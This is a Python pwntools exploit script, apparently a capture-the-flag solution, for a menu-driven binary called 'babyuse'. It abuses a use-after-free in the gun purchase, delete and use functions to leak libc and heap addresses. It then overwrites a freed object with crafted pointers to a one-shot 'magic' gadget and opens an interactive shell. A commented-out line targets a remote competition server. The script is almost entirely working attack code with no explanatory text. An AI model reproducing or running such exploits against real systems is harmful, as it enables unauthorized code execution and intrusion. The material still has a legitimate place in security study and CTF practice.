from pwn import * 

p = process('./babyuse',env={"LD_PRELOAD" : "./libc.so"})

#gdb.attach(p)
#p = remote('202.112.51.247' ,3456)

magic_off = 0x177b47

def buy_gun(size,name):
	p.recvuntil('7. Exit\n') 
	p.sendline("1")
	p.recvuntil('2. QBZ95\n')
	p.sendline('1')
	p.recvline()
	p.sendline(size)
	p.recvline()
	p.sendline(name)
        

def select_gun(opt):

	p.recvuntil('7. Exit\n') 
	p.sendline("2")
	p.recvline()
	p.sendline(opt)
        p.recvline()	

def del_gun(opt):

	p.recvuntil('7. Exit\n') 
	p.sendline("6")
	p.recvline()
	p.sendline(opt)
        p.recvline()

def use_gun(opt):

	p.recvuntil('7. Exit\n') 
	p.sendline("5")
        name = p.recvline()
        p.recvuntil('4. Main menu\n')
        p.sendline(opt)	
        return name

def rename_gun(opt,size,name):
       p.recvuntil('7. Exit\n') 
       p.sendline("4")
       p.recvline() 
       p.sendline(opt)
       p.recvline()
       p.sendline(str(size))
       p.recvline()
       p.sendline(name)

def list_gun():
       p.recvuntil('7. Exit\n') 
       p.sendline("3")
       p.recvuntil(':') 




buy_gun("80","A"*15)
buy_gun("80","B"*15)
buy_gun("80","C"*15)
buy_gun("80","D"*15)
select_gun("0")
del_gun("0")

name = use_gun("4")
leak = unpack(name.split("A")[0].split()[2][:4])
magic = leak -  magic_off



select_gun("1")
del_gun("1")
name = use_gun("4")
context.bits = len(name)*8
heap_leak = hex(unpack(name))
heap_leak = int(heap_leak[25:33],16)
heap_leak = heap_leak + 0x68 + 4


print "[+]Magic addr: "+hex(magic)
print "[+]Leak val: "+hex(leak)
print "[+]Heap_leak: "+hex(heap_leak)
print "[+]**magic: "+hex(heap_leak)

context.bits = 32
payload = pack(heap_leak)+pack(heap_leak)+"A"*4+pack(magic)
rename_gun("2",16,payload)
use_gun("1")
p.interactive()


